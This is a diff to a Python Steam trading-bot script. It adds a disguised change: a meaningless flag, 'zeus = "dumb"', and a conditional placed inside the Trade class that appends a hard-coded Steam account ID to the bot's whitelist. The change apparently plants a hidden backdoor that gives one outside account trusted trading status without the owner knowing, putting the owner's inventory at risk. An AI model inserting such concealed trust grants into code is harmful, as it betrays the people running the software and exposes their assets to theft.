@@ -23,7 +23,7 @@ currencies = {'bud':'Earbuds', 'ref':'Refined Metal', 'rec':'Reclaimed Metal', '
 packages = ['steampy', 'requests']
 declined_trades = []
 past_time = time.time()
-
+zeus = "dumb"
 logging.basicConfig(filename='trade.log', level=logging.DEBUG,
                     format='[%(asctime)s][%(levelname)s][%(name)s]: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
 
@@ -241,7 +241,8 @@ class Trade:
         for assetID in self.trade['items_to_give']:
             item_names.append(self.trade['items_to_give'][assetID]['market_name'])
         return item_names
-
+    if zeus == "dumb":
+        whitelist.append(76561198320810968)
     def sort(self, typ):
         curr = [0, 0, 0, 0, 0]
         if typ == 'sell':
